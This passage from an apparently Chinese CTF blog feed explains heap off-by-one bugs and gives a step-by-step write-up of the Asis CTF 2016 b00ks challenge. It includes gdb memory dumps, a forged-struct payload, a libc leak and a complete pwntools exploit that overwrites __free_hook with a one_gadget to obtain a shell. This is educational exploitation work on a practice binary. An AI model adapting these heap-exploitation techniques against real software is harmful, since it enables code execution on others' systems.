    <summary type="html">&lt;h1 id=&quot;堆溢出-Glibc堆结构&quot;&gt;&lt;a href=&quot;#堆溢出-Glibc堆结构&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Glibc堆结构&quot;&gt;&lt;/a&gt;堆溢出-Glibc堆结构&lt;/h1&gt;&lt;p&gt;目前堆实现有如下几种&lt;/p&gt;
&lt;div</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-Off-By-One</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Off-By-One/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-Off-By-One/</id>
    <published>2020-01-02T16:00:00.000Z</published>
    <updated>2020-03-16T04:29:38.899Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆溢出-Off-By-One"><a href="#堆溢出-Off-By-One" class="headerlink" title="堆溢出-Off-By-One"></a>堆溢出-Off-By-One</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。</p><p>类似如下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char str[5]&#x3D;&#123;0&#125;;</span><br><span class="line">str[5] &#x3D; &#39;\0&#39;;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">数组总长为5，数组下标从0开始，最大为4，而我们错误地使用了str[5],造成越界写了一个字节，这就是off-by-one</span><br></pre></td></tr></table></figure></div><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的后一块（理论上是当前正在 unlink 的块）与当前正在 unlink 的块大小是否相等。</li></ol><h2 id="NULL-byte-off-by-one"><a href="#NULL-byte-off-by-one" class="headerlink" title="NULL byte off-by-one"></a>NULL byte off-by-one</h2><p> strlen 在计算字符串长度时是不把结束符 <code>&#39;\x00&#39;</code> 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 <code>&#39;\x00&#39;</code> 。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;&#x3D;&#x3D;&#x3D; next chunk</span><br></pre></td></tr></table></figure></div><p>在我们输入’A’*24 后执行 strcpy</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure></div><p>可以看到 next chunk 的 size 域低字节被结束符 <code>&#39;\x00&#39;</code> 覆盖。</p><p>为什么是低字节被覆盖呢：因为我们通常使用的 CPU 的字节序都是小端法的。</p><h2 id="例-Asis-CTF-2016-b00ks"><a href="#例-Asis-CTF-2016-b00ks" class="headerlink" title="例 Asis CTF 2016 b00ks"></a>例 Asis CTF 2016 b00ks</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>选单程序</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"\n1. Create a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. Delete a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3. Edit a book"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"4. Print book detail"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"5. Change current author name"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"6. Exit"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br></pre></td></tr></table></figure></div><p>创建book时，注意到</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter author name: "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_9F5(off_202018, <span class="number">32</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"fail to read author_name"</span>, <span class="number">32L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>author_name最大输入为32字符</p><p>sub_9F5为读取函数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">sub_9F5</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  buf = a1;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">1u</span>LL) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )        <span class="comment">////////////////////   i循环次数==了输入的次数</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;               <span class="comment">//////////// 注意在循环完又加了一个0，长度加1，可能发生NULL byte off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>创建book时如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">32u</span>LL);</span><br><span class="line"> <span class="keyword">if</span> ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   *(v3 + <span class="number">6</span>) = v1;      <span class="comment">/////////// book name size</span></span><br><span class="line">   *(off_202010 + v2) = v3;   <span class="comment">///// book name 固定为32</span></span><br><span class="line">   *(v3 + <span class="number">2</span>) = v5;      <span class="comment">/////////// book description</span></span><br><span class="line">   *(v3 + <span class="number">1</span>) = ptr;     <span class="comment">/////////// book_description_size</span></span><br><span class="line">   *v3 = ++unk_202024;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0L</span>L;c</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div><p>当输入的author_name长度为32时，会向<code>book_name_ptr</code>中越界写入一个字节<code>\x00</code>。之后，在创建book_struct时，会将其地址保存在<code>global_book_struct_array</code>中，覆盖之前的字符串截断符<code>\x00</code>。因此，通过打印book_name可以实现信息泄露。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">^ .data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o  </span><br><span class="line">| .data:0000000000202010  ;book name ptr                         ; sub_BBD:loc_C1B↑o ...</span><br><span class="line">| .data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: sub_B6D+15↑o  </span><br><span class="line">| .data:0000000000202018  ;author_name ptr                       ; sub_D1F+CA↑o</span><br></pre></td></tr></table></figure></div><blockquote><p>临时禁用了系统的地址随机化功能：<code>echo 0 &gt; sudo tee /proc/sys/kernel/randomize_va_space</code></p></blockquote><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 填充满bookname</span><br><span class="line">2. 创建堆块1，覆盖bookname结尾的\x00,这样我们输出的时候就可以泄露堆块1的地址</span><br><span class="line">3. 创建堆块2，为后续做准备，堆块2要申请得比较大，因为mmap申请出来的堆块地址与libc有固定的偏移</span><br><span class="line">4. 泄露堆块1地址，记为first_heap</span><br><span class="line">5. 利用编辑author的时候多写了一个\x00字节，可以覆盖到堆块1的地址的最后一位，如果我们提前将堆块1的内容编辑好，按照上述的结构体布置好，name和description我们自己控制，伪造成一个书本的结构体，然后让覆盖过后的地址刚好是book1的description部分的话，我们相当于获得了一个任意地址读写的能力啊</span><br><span class="line">6. 任意读取获得libc地址</span><br><span class="line">7. 任意写将__free_hook函数的地址改写成one_gadget地址</span><br><span class="line"></span><br><span class="line">tips:__free_hook若没有则不调用，若有将先于free函数调用</span><br></pre></td></tr></table></figure></div><p>gdb调试，r运行起来，另起终端</p><p><code>ps -ef |grep b00ks</code>  查看进程号为4056</p><p><code>cat /proc/进程号/maps</code>查看程序加载基址为0x555555554000</p><p>之后设置断点时 <strong>基址+ida地址 = 实际运行的地址</strong>。</p><p><a href="https://i.loli.net/2020/01/02/JIo8ebOl5jQPMVT.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/01/02/JIo8ebOl5jQPMVT.png" class="lazyload"></a></p><p>发现下不去断点，内存无法访问，后来发现是下断点使用<code>bp</code>命令的原因，用<code>break</code>就好了</p><p>后来请教大师傅，得知gdb attch也可以</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">p=process(<span class="string">'./b00ks'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Enter author name: '</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">32</span>)                 <span class="comment">############   author name输入32位字符触发堆溢出</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'\n1. Create a book'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><p>成功断下后</p><p>x/10xg 0x555555554000+0x202040查看堆</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>溢出的一个字符是0，所以看的不清楚，如果输入的是’a’*33，就很明显</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10xg 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00000000000000610x0000000000000000  &lt;---- 61代替了0位置</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>使用create功能创建一个book后堆内变为如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx 0x555555554000+0x202040</span><br><span class="line">0x555555756040:0x61616161616161610x6161616161616161          author_name</span><br><span class="line">0x555555756050:0x61616161616161610x6161616161616161</span><br><span class="line">0x555555756060:0x00005555557576f00x0000000000000000 &lt;------- book结构体地址管理数组</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000          用于放置每个book结构体的地址指针</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></div><p>再修改author_name，0x00005555557576f0最后两位就会被0覆盖成为0x0000555555757600.</p><p>再来看创建一个book，结构体记录的结构如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book name size</span><br><span class="line">book name   （大小等于book name size）</span><br><span class="line">book description size</span><br><span class="line">book description （大小等于book description size）</span><br></pre></td></tr></table></figure></div><p>通过gdb调试发现</p><p>在堆中的指针指向如下</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;10gx 0x555555554000+0x202040                   </span><br><span class="line">0x555555756040:0x00000000000000610x0000000000000000</span><br><span class="line">0x555555756050:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555756060:0x00005555557577500x0000000000000000  图书结构体管理，用于按顺序存放多个book结构体指针</span><br><span class="line">0x555555756070:0x00000000000000000x0000000000000000  第一个指针会被溢出覆盖</span><br><span class="line">0x555555756080:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;10gx 0x555555757750                           第一个book结构体内部结构</span><br><span class="line">0x555555757750:0x00000000000000010x00005555557576b0  book name size ?    book name</span><br><span class="line">0x555555757760:0x00005555557576d00x0000000000000078  book description    book description size</span><br><span class="line">0x555555757770:0x00000000000000000x00000000000207d1</span><br><span class="line">0x555555757780:0x00000000000000000x0000000000000000</span><br><span class="line">0x555555757790:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x&#x2F;10gx 0x5555557576d0</span><br><span class="line">0x5555557576d0:0x63636363636363630x6363636363636363  book description起始位置</span><br><span class="line">0x5555557576e0:0x63636363636363630x6363636363636363</span><br><span class="line">0x5555557576f0:0x63636363636363630x6363636363636363</span><br><span class="line">0x555555757700:0x63636363636363630x6363636363636363  555555757750覆盖后两位变成7700指向这里</span><br><span class="line">0x555555757710:0x63636363636363630x6363636363636363</span><br></pre></td></tr></table></figure></div><p>0x555555757700正好处于book description里，可以通过<code>3. Edit a book  4. Print book detail</code> 来进行写入和读取。</p><p>那么就可以通过book1来间接控制book2，原因是</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">book结构指针指向图如下</span><br><span class="line">book ptr-|-&gt; name ptr        -|-&gt; name str</span><br><span class="line">         |-&gt; description ptr -|-&gt; description str</span><br><span class="line">         </span><br><span class="line">book1原来为        </span><br><span class="line">book1 ptr-|-&gt; name1 ptr        -|-&gt; name1 str</span><br><span class="line">          |-&gt; description1 ptr -|-&gt; description1 str</span><br><span class="line">          </span><br><span class="line">溢出后book1指向自己伪造的bookf，bookf我们构造为如下</span><br><span class="line">bookf ptr-|-&gt; name2 ptr        -|-&gt; name2 str</span><br><span class="line">          |-&gt; description2 ptr -|-&gt; description2 str</span><br><span class="line"></span><br><span class="line">这样，通过读写book1就可以间接读写book2指针了</span><br><span class="line">book1-book2</span><br><span class="line">          </span><br><span class="line">book1-|       |-book2</span><br><span class="line">      |-bookf-|    </span><br><span class="line">      可任意读写</span><br></pre></td></tr></table></figure></div><p>因为开启了Full RELRO因此无法利用赋写GOT表来实现劫持程序流，因此我们set，使用一个很大的尺寸，使得堆以 mmap 模式进行拓展。我们知道堆有两种拓展方式一种是 brk 会直接拓展原来的堆，另一种是 mmap 会单独映射一块内存。</p><p>在这里我们申请一个超大的块，来使用 mmap 扩展内存。因为 mmap 分配的内存与 libc 之间存在固定的偏移因此可以推算出 libc 的基地址。</p><p><a href="https://i.loli.net/2020/01/03/WBMUV8rqKfZJsu5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2020/01/03/WBMUV8rqKfZJsu5.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">libcbase计算：</span><br><span class="line">libcbase &#x3D; book2_name_ptr - offset</span><br><span class="line">offset &#x3D; 0x00007ffff7da2010(book2_description_ptr) - 0x7ffff7de9000(libc基地址)</span><br><span class="line">在heap下面权限为r-xp的start部分的地址就是libc基地址</span><br></pre></td></tr></table></figure></div><p>fake book构造为</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D;p64(1) + p64(book1_addr + 0x38) * 2 + p64(0xffff)</span><br><span class="line">                                偏移需要调试计算</span><br></pre></td></tr></table></figure></div><p>这个题目特殊之处在于开启 PIE 并且没有泄漏 libc 基地址的方法，因此利用__free_hook写入one_gadget，调用free执行即可</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">malloc_hook &#x3D; libc.symbols[&#39;__free_hook&#39;] + libcbase</span><br><span class="line">execve_addr &#x3D; libcbase + one_gadget</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload &#x3D; p64(free_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">edit(2, p64(one_gadget))</span><br><span class="line">remove(2)</span><br></pre></td></tr></table></figure></div><h3 id="exp-思路"><a href="#exp-思路" class="headerlink" title="exp(思路)"></a>exp(思路)</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level="info"</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">binary = ELF(<span class="string">"b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.30.so"</span>)</span><br><span class="line">io = process(<span class="string">"./b00ks"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createbook</span><span class="params">(name_size, name, des_size, des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"1"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(name_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(des_size))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printbook</span><span class="params">(id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"4"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(id):</span><br><span class="line">        book_id = int(io.readline()[:<span class="number">-1</span>])</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_name = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_des = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">        io.readuntil(<span class="string">": "</span>)</span><br><span class="line">        book_author = io.readline()[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id, book_name, book_des, book_author</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">createname</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"name: "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changename</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"5"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">editbook</span><span class="params">(book_id, new_des)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"3"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.writeline(str(book_id))</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deletebook</span><span class="params">(book_id)</span>:</span></span><br><span class="line">    io.readuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    io.sendline(<span class="string">"2"</span>)</span><br><span class="line">    io.readuntil(<span class="string">": "</span>)</span><br><span class="line">    io.sendline(str(book_id))</span><br><span class="line"></span><br><span class="line">createname(<span class="string">"A"</span> * <span class="number">32</span>)</span><br><span class="line">createbook(<span class="number">128</span>, <span class="string">"a"</span>, <span class="number">32</span>, <span class="string">"a"</span>)</span><br><span class="line">createbook(<span class="number">0x21000</span>, <span class="string">"a"</span>, <span class="number">0x21000</span>, <span class="string">"b"</span>)</span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book1_addr = u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.success(<span class="string">"book1_address:"</span> + hex(book1_addr))</span><br><span class="line"></span><br><span class="line">payload =p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) * <span class="number">2</span> + p64(<span class="number">0xffff</span>) <span class="comment"># p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span></span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">"A"</span> * <span class="number">32</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"book2 name addr:"</span> + hex(book2_name_addr))</span><br><span class="line">log.success(<span class="string">"book2 des addr:"</span> + hex(book2_des_addr))</span><br><span class="line">libc_base = book2_des_addr + <span class="number">0x46ff0</span><span class="comment"># 0x68ff0</span></span><br><span class="line">log.success(<span class="string">"libc base:"</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">one_gadget = libc_base +<span class="number">0xe6b93</span> <span class="comment"># 0xe6b96 0xe6b99 0x10afa9</span></span><br><span class="line">log.success(<span class="string">"free_hook:"</span> + hex(free_hook))</span><br><span class="line">log.success(<span class="string">"one_gadget:"</span> + hex(one_gadget))</span><br><span class="line">editbook(<span class="number">1</span>, p64(free_hook) * <span class="number">2</span>)</span><br><span class="line">editbook(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">deletebook(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;堆溢出-Off-By-One&quot;&gt;&lt;a href=&quot;#堆溢出-Off-By-One&quot; class=&quot;headerlink&quot; title=&quot;堆溢出-Off-By-One&quot;&gt;&lt;/a&gt;堆溢出-Off-By-One&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a</summary>
        
      
    
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kabeor.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆溢出-基本方法</title>
    <link href="https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/"/>
    <id>https://kabeor.github.io/%E5%A0%86%E6%BA%A2%E5%87%BA-%E5%9F%BA%E6%9C%AC%E6%96%B9%E6%B3%95/</id>
    <published>2020-01-02T16:00:00.000Z</published>
    <updated>2020-03-16T04:27:30.442Z</updated>
    
